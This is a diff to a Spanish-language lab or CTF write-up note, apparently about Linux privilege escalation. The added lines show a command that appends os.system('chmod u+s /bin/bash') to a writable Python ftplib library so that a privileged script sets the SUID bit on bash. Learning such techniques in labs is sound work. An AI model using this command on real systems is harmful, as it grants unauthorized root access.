@@ -845,5 +845,13 @@ haciendo un `cat` al script `ftpclient.py` nos damos cuenta que es el script que
 revisando la librería nos damos cuenta que tenemos permisos de escritura
 ![[Pasted image 20240622212156.png]]
 
+`cambiamos los permisos de la bash `
+agregamos el comando
+
+```python
+echo 'os.system("chmod u+s /bin/bash")' >> /usr/lib/python2.7/ftplib.py
+```
+
+![[Pasted image 20240622213606.png]]
 
 ![[Pasted image 20240622213510.png]]
